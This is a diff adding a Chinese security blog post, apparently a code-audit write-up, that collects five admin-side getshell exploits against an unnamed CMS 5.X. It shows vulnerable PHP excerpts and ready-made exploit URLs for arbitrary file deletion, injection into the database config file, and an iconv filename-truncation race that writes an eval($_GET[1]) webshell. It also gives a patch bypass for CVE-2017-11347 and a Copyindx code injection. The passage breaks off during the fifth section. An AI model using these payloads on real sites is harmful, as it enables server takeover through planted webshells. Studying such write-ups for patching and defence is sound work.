@@ -442,6 +442,190 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://blackwolfsec.cc/2018/03/04/5_x_getshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BlackWolfsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/static/picture/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BlackWolfsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/04/5_x_getshell/" itemprop="url">某CMS5.X版本GETSHELL漏洞合集-五连杀</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-04T00:00:00+08:00">
+                2018-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>首发于：<a href="https://xz.aliyun.com/t/2096" target="_blank" rel="noopener">先知社区: 某CMS 5.X版本GETSHELL漏洞合集</a><br>2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。</p>
+<h2 id="0x01安装过程过滤不严导致Getshell"><a href="#0x01安装过程过滤不严导致Getshell" class="headerlink" title="0x01安装过程过滤不严导致Getshell"></a>0x01安装过程过滤不严导致Getshell</h2><p><em>前提:有删除/config/install.lock权限</em></p>
+<h3 id="1-结合网上爆出某CMS-的后台任意文件删除漏洞"><a href="#1-结合网上爆出某CMS-的后台任意文件删除漏洞" class="headerlink" title="1. 结合网上爆出某CMS 的后台任意文件删除漏洞"></a>1. 结合网上爆出某CMS 的后台任意文件删除漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#/admin/app/batch/csvup.php</span></span><br><span class="line"></span><br><span class="line">$classflie=explode(<span class="string">'_'</span>,$fileField);</span><br><span class="line">$classflie=explode(<span class="string">'-'</span>,$classflie[count($classflie)<span class="number">-1</span>]);</span><br><span class="line">$class1=$classflie[<span class="number">0</span>];</span><br><span class="line">$class2=$classflie[<span class="number">1</span>];</span><br><span class="line">$class3=$classflie[<span class="number">2</span>];</span><br><span class="line">$class=$class3?$class3:($class2?$class2:$class1); </span><br><span class="line">$classcsv=$db-&gt;get_one(<span class="string">"select * from $met_column where id=$class"</span>);</span><br><span class="line"><span class="keyword">if</span>(!$classcsv)&#123;</span><br><span class="line">metsave(<span class="string">"../app/batch/contentup.php?anyid=$anyid&amp;lang=$lang"</span>,$lang_csvnocolumn,$depth);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 省略代码</span></span><br><span class="line"></span><br><span class="line">@file_unlink($flienamecsv);</span><br></pre></td></tr></table></figure>
+<p>删除/config/install.lock文件可以导致重装（需要由对应的删除权限），删除文件的poc如下：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx.com<span class="regexp">/admin/</span>app<span class="regexp">/batch/</span>csvup.php?fileField=<span class="number">1</span>_1231-<span class="number">1</span>&amp;flienamecsv=..<span class="regexp">/../</span>..<span class="regexp">/config/i</span>nstall.lock</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-重装时数据库配置文件过滤不当"><a href="#2-重装时数据库配置文件过滤不当" class="headerlink" title="2. 重装时数据库配置文件过滤不当"></a>2. 重装时数据库配置文件过滤不当</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/install/index.php</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'db_setup'</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($setup==<span class="number">1</span>)&#123;</span><br><span class="line">            $db_prefix      = trim($db_prefix);</span><br><span class="line">            $db_host        = trim($db_host);</span><br><span class="line">            $db_username    = trim($db_username);</span><br><span class="line">            $db_pass        = trim($db_pass);</span><br><span class="line">            $db_name        = trim($db_name);</span><br><span class="line">            $config=<span class="string">"&lt;?php</span></span><br><span class="line"><span class="string">                   /*</span></span><br><span class="line"><span class="string">                   con_db_host = \"$db_host\"</span></span><br><span class="line"><span class="string">                   con_db_id   = \"$db_username\"</span></span><br><span class="line"><span class="string">                   con_db_pass    = \"$db_pass\"</span></span><br><span class="line"><span class="string">                   con_db_name = \"$db_name\"</span></span><br><span class="line"><span class="string">                   tablepre    =  \"$db_prefix\"</span></span><br><span class="line"><span class="string">                   db_charset  =  \"utf8\";</span></span><br><span class="line"><span class="string">                  */</span></span><br><span class="line"><span class="string">                  ?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            $fp=fopen(<span class="string">"../config/config_db.php"</span>,<span class="string">'w+'</span>);</span><br><span class="line">            fputs($fp,$config);</span><br><span class="line">            fclose($fp);</span><br></pre></td></tr></table></figure>
+<p>在数据库配置时$db_host,$db_username,$db_pass,$db_name,$db_prefix参数可控。</p>
+<h3 id="3-POC"><a href="#3-POC" class="headerlink" title="3. POC"></a>3. POC</h3><p>数据库配置时修改任意参数为<code>*/phpinfo();/*</code>可导致Getshell。点击保存之后，直接访问/config/config_db.php即可getshell。<br>shell地址:<code>http://xxx.com/config/config_db.php</code></p>
+<h2 id="0x02-iconv函数缺陷-条件竞争Getshell"><a href="#0x02-iconv函数缺陷-条件竞争Getshell" class="headerlink" title="0x02 iconv函数缺陷+条件竞争Getshell"></a>0x02 iconv函数缺陷+条件竞争Getshell</h2><p><em>前提:windows服务器+php版本&lt;5.4.0</em></p>
+<h3 id="1-漏洞点"><a href="#1-漏洞点" class="headerlink" title="1. 漏洞点"></a>1. 漏洞点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#\admin\app\batch\csv.php</span></span><br><span class="line"></span><br><span class="line">fputcsv($fp,$fristarray); </span><br><span class="line">fputcsv($fp,$csvarray); </span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sqlzip=<span class="string">'csv.zip'</span>;</span><br><span class="line">$archive = <span class="keyword">new</span> PclZip($sqlzip);</span><br><span class="line">$zip_list = $archive-&gt;create(<span class="string">"./$title.csv"</span>);</span><br><span class="line">$cont  = iconv($codeold,$codenew,<span class="string">"&#123;$lang_csvexplain1&#125;\r\n&#123;$lang_csvexplain2&#125;\r\n&#123;$lang_csvexplain3&#125;\r\n&#123;$lang_csvexplain4&#125;"</span>);</span><br><span class="line">$fp = fopen(iconv($codeold,$codenew,<span class="string">"./&#123;$lang_langshuom&#125;.txt"</span>),w);</span><br><span class="line">fputs($fp, $cont);</span><br><span class="line">fclose($fp);</span><br><span class="line">$zip_list = $archive-&gt;add(iconv($codeold,$codenew,<span class="string">"./&#123;$lang_langshuom&#125;.txt"</span>));</span><br><span class="line">@file_unlink(<span class="string">"./$title.csv"</span>);</span><br><span class="line">@file_unlink(iconv($codenew,$codeold,<span class="string">"./$title.csv"</span>));</span><br><span class="line">@file_unlink(iconv($codeold,$codenew,<span class="string">"./&#123;$lang_langshuom&#125;.txt"</span>));</span><br></pre></td></tr></table></figure>
+<p>(1)文件名截断+任意内容写入</p>
+<p>将lang_langshuom参数的值经过iconv转换后直接写文件，由于PHP版本&lt;5.4.0时,会忽略掉不认识的字符，所以可以控制文件名参数lang_langshuom生成php后缀文件，同时将lang_csvexplain1、lang_csvexplain2、lang_csvexplain3参数的内容写入文件，所以存在getshell的风险。</p>
+<p>请求如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/app/batch/csv.php?lang_title=11&amp;lang_langshuom=tmp.php%80&amp;lang_csvexplain1=<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>(2)条件竞争</p>
+<p>然而由于@file_unlink(iconv($codeold,$codenew,”./{$lang_langshuom}.txt”));会删除生成的shell文件，不能手动getshell，再次分析源码发现，此处为生成了shell文件，然后再删除。所以只要在删除前请求shell生成其他文件即可，即利用条件竞争，生成持久性webshell,写脚本即可实现。</p>
+<h3 id="2-POC脚本"><a href="#2-POC脚本" class="headerlink" title="2. POC脚本"></a>2. POC脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">略</span><br></pre></td></tr></table></figure>
+<p>修改参数后执行效果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python poc.py</span><br><span class="line">shell @ http://127.0.0.1/某CMS 5.3.19//admin/app/batch/shell.php</span><br></pre></td></tr></table></figure></p>
+<p>ps:<br>利用php特性可以不用条件竞争，直接getshell<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/app/batch/csv.php?lang_title=11&amp;lang_langshuom=1.php/.%80&amp;lang_csvexplain1=<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x03-CVE-2017-11347补丁绕过继续Getshell"><a href="#0x03-CVE-2017-11347补丁绕过继续Getshell" class="headerlink" title="0x03 CVE-2017-11347补丁绕过继续Getshell"></a>0x03 CVE-2017-11347补丁绕过继续Getshell</h2><p><em>前提：windows服务器+网站绝对路径（只需要知道网站index.php所在目录的上一级目录名）</em></p>
+<h3 id="1-查找绝对路径的方法："><a href="#1-查找绝对路径的方法：" class="headerlink" title="1. 查找绝对路径的方法："></a>1. 查找绝对路径的方法：</h3><ul>
+<li>利用安装目录下的phpinfo文件： <code>/install/phpinfo.php</code></li>
+<li>利用报错信息(<strong>信息在HTML注释中，必须通过查看网页源码的方式才能获取内容，否则看上去是空白页</strong>)<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/app/</span>system<span class="regexp">/include/</span><span class="keyword">public</span><span class="regexp">/ui/</span>admin/top.php</span><br><span class="line"><span class="regexp">/app/</span>system<span class="regexp">/include/</span><span class="keyword">public</span><span class="regexp">/ui/</span>admin/box.php</span><br><span class="line"><span class="regexp">/app/</span>system<span class="regexp">/include/</span><span class="keyword">public</span><span class="regexp">/ui/</span>web/sidebar.php</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h3><p>5.3.19版本针对CVE-2017-11347的补丁分析<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($val[<span class="number">2</span>])&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      $address=<span class="string">"../about/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      $address=<span class="string">"../news/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      $address=<span class="string">"../product/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      $address=<span class="string">"../download/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      $address=<span class="string">"../img/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      $address=<span class="string">"../feedback/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">      $address = <span class="string">""</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line">   $newfile  =<span class="string">"../../../$val[1]"</span>; </span><br><span class="line">   <span class="keyword">if</span>($address != <span class="string">''</span>)&#123;</span><br><span class="line">      Copyfile($address,$newfile);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>即：5.3.19版本采取：即使在$var[2]为空时，默认给address变量赋值为空，并且会判断address参数不为空才调用Copyfile。但是当$var[2]不为空时，由于fileaddr[1]可控导致，仍然可以控制文件路径从而Getshell。</p>
+<p>漏洞利用(网站安装在服务器根路径的情况)：</p>
+<p>第一步，新建1.ico文件，内容为：&lt;?php phpinfo();?&gt;<br>在后台”地址栏图标”处上传该文件。<br>得到地址为：<a href="http://localhost/upload/file/1506587082.ico" target="_blank" rel="noopener">http://localhost/upload/file/1506587082.ico</a></p>
+<p>第二步，发送如下payload(注意左斜杠和右斜杠不能随意更改):<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..<span class="symbol">\u</span>pload<span class="symbol">\f</span>ile<span class="symbol">\1</span>506587082.ico/..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\w</span>ww<span class="symbol">\a</span>bout<span class="symbol">\s</span>hell.php|1</span><br></pre></td></tr></table></figure></p>
+<p>shell的地址为：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/about/</span>shell.php</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-POC-注意左斜杠和右斜杠不能随意更改-："><a href="#3-POC-注意左斜杠和右斜杠不能随意更改-：" class="headerlink" title="3. POC(注意左斜杠和右斜杠不能随意更改)："></a>3. POC(注意左斜杠和右斜杠不能随意更改)：</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..<span class="symbol">\上</span>传ico文件的相对路径/..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\网</span>站index.php路径的上一层目录名<span class="symbol">\a</span>bout<span class="symbol">\w</span>ebshell的文件名|1</span><br></pre></td></tr></table></figure>
+<p>特别注意其中的：“网站index.php上层目录名”，</p>
+<p>1.如果网站安装在服务器根目录，这wamp/phpstudy默认目录值为“www”；网站index.php上层目录名设置为”www”;  如果为lamp环境，这默认目录值为“html”网站index.php上层目录名设置为”html”;。其他的环境类推（利用绝对路径泄露）。</p>
+<p>2.如果网站安装在服务器的二级目录下，则网站index.php上层目录名设置为二级目录名。</p>
+<p>例如:网站搭建在:<a href="https://note.youdao.com/" target="_blank" rel="noopener">http://localhost/某CMS 5.3.19/</a>,则第二步的payload如下：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://localhost/某CMS 5.3.19/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..<span class="symbol">\u</span>pload<span class="symbol">\f</span>ile<span class="symbol">\1</span>506588072.ico/..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\某</span>CMS 5.3.19<span class="symbol">\a</span>bout<span class="symbol">\s</span>hell.php|1</span><br></pre></td></tr></table></figure></p>
+<p>相应生成的shell地址为：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/某CMS 5.3.19/</span>about<span class="regexp">/shell.php</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x04-Copyindx函数处理不当Getshell"><a href="#0x04-Copyindx函数处理不当Getshell" class="headerlink" title="0x04 Copyindx函数处理不当Getshell"></a>0x04 Copyindx函数处理不当Getshell</h2><h3 id="1-声明"><a href="#1-声明" class="headerlink" title="1. 声明"></a>1. 声明</h3><p>此漏洞点位于admin/app/physical/physical.php文件，漏洞和CVE-2017-11347：<a href="https://github.com/imp0wd3r/vuln-papers/tree/master/某CMS-5317-auth-rce漏洞十分相似，但是存在根本的差异，不同点如下：" target="_blank" rel="noopener">https://github.com/imp0wd3r/vuln-papers/tree/master/某CMS-5317-auth-rce漏洞十分相似，但是存在根本的差异，不同点如下：</a></p>
+<p>（1）触发函数是Copyindex函数，而非Copyfile</p>
+<p>（2）此漏洞不是利用文件包含require_one，而是利用任意内容写入</p>
+<p>（3）此漏洞Getshell不需要上传图片</p>
+<p>（4）结合CSRF可以实现一键Getshell</p>
+<h3 id="2-漏洞点"><a href="#2-漏洞点" class="headerlink" title="2. 漏洞点"></a>2. 漏洞点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin/app/physical/physical.php:197-236</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>($op)&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">if</span>(is_dir(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]))&#123;</span><br><span class="line">      deldir(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">echo</span> $lang_physicaldelok;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;unlink(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">echo</span> $lang_physicaldelok;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      $adminfile=$url_array[count($url_array)<span class="number">-2</span>];</span><br><span class="line">      $strsvalto=readmin($val[<span class="number">1</span>],$adminfile,<span class="number">1</span>);</span><br><span class="line">      filetest(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      deldir(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      $dlappfile=parse_ini_file(<span class="string">'dlappfile.php'</span>,<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">if</span>($dlappfile[$strsvalto][<span class="string">'dlfile'</span>])&#123;</span><br><span class="line">         $return=varcodeb(<span class="string">'app'</span>);</span><br><span class="line">         $checksum=$return[<span class="string">'md5'</span>];</span><br><span class="line">         $met_file=<span class="string">'/dl/app_curl.php'</span>;</span><br><span class="line">         $stringfile=dlfile($dlappfile[$strsvalto][<span class="string">'dlfile'</span>],<span class="string">"../../../$val[1]"</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         $met_file=<span class="string">'/dl/olupdate_curl.php'</span>;</span><br><span class="line">         $stringfile=dlfile(<span class="string">"v$metcms_v/$strsvalto"</span>,<span class="string">"../../../$val[1]"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>($stringfile==<span class="number">1</span>)&#123;</span><br><span class="line">         <span class="keyword">echo</span> $lang_physicalupdatesuc;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> dlerror($stringfile);</span><br><span class="line">         <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      $fileaddr=explode(<span class="string">'/'</span>,$val[<span class="number">1</span>]);</span><br><span class="line">      $filedir=<span class="string">"../../../"</span>.$fileaddr[<span class="number">0</span>];  </span><br><span class="line">      <span class="keyword">if</span>(!file_exists($filedir))&#123; @mkdir ($filedir, <span class="number">0777</span>); &#125; </span><br><span class="line">      <span class="keyword">if</span>($fileaddr[<span class="number">1</span>]==<span class="string">"index.php"</span>)&#123;</span><br><span class="line">         Copyindx(<span class="string">"../../../"</span>.$val[<span class="number">1</span>],$val[<span class="number">2</span>]);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p>当$action等于op而且$op等于3的时候，如果$filedir不存在则创建$filedir目录，而且如果$fileaddr[1]等于”index.php”则调用Copyindex函数，并传入$val[1]和$val[2]参数，此处两个参数来自变量$valphy,均可控！！跟进Copyindex函数源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#admin/include/global.func.php:877-884</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Copyindx</span><span class="params">($newindx,$type)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(!file_exists($newindx))&#123;</span><br><span class="line">      $oldcont =<span class="string">"&lt;?php\n# 某CMS  Enterprise Content Management System \n# Copyright (C) 某CMS  Co.,Ltd (http://www.某CMS.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) 某CMS  Co., Ltd. (http://www.某CMS.cn). All rights reserved.\n?&gt;"</span>;</span><br><span class="line">      $fp = fopen($newindx,w);</span><br><span class="line">      fputs($fp, $oldcont);</span><br><span class="line">      fclose($fp);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可见，直接把参数$type直接赋值给$fmodule,并写入文件内容，所以可以构造payload直接getshell.</p>
+<h3 id="3-POC-xxx为任意的shell目录，index-php文件名不能修改"><a href="#3-POC-xxx为任意的shell目录，index-php文件名不能修改" class="headerlink" title="3. POC(xxx为任意的shell目录，index.php文件名不能修改)"></a>3. POC(xxx为任意的shell目录，index.php文件名不能修改)</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/某CMS 5.3.18/</span>admin<span class="regexp">/app/</span>physical<span class="regexp">/physical.php?action=op&amp;op=3&amp;valphy=123|xxx/i</span>ndex.php|<span class="number">123</span>;phpinfo();?&gt;<span class="regexp">/*</span></span><br></pre></td></tr></table></figure>
+<p>生成的shell地址：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/某CMS 5.3.18/</span>xxx<span class="regexp">/index.php</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x05-olupdate文件缺陷导致Getshell"><a href="#0x05-olupdate文件缺陷导致Getshell" class="headerlink" title="0x05 olupdate文件缺陷导致Getshell"></a>0x05 olupdate文件缺陷导致Getshell</h2><h3 id="1-漏洞点-1"><a href="#1-漏洞点-1" class="headerlink" title="1. 漏洞点"></a>1. 漏洞点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/admin/system/olupdate.phpwen文件中，当$action=sql,$sql!=No Date且$sqlfile不是数组时进入如下过程</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#326-360行</span></span><br><span class="line"><span class="variable">$num</span>=1;</span><br><span class="line"><span class="variable">$random</span> = met_rand(6);</span><br><span class="line"><span class="variable">$date</span>=date(<span class="string">'Ymd'</span>,time());</span><br><span class="line">require_once <span class="string">'../system/database/global.func.php'</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="variable">$sqldump</span> = <span class="string">''</span>;</span><br><span class="line">    <span class="variable">$startrow</span> = <span class="string">''</span>;</span><br><span class="line">    <span class="variable">$tables</span>=tableprearray(<span class="variable">$tablepre</span>);</span><br><span class="line">    <span class="variable">$sizelimit</span>=2048;</span><br><span class="line">    <span class="variable">$tableid</span> = isset(<span class="variable">$tableid</span>) ? <span class="variable">$tableid</span> - 1 : 0;</span><br><span class="line">    <span class="variable">$startfrom</span> = isset(<span class="variable">$startfrom</span>) ? intval(<span class="variable">$startfrom</span>) : 0;</span><br><span class="line">    <span class="variable">$tablenumber</span> = count(<span class="variable">$tables</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="variable">$tableid</span>; <span class="variable">$i</span> &lt; <span class="variable">$tablenumber</span> &amp;&amp; strlen(<span 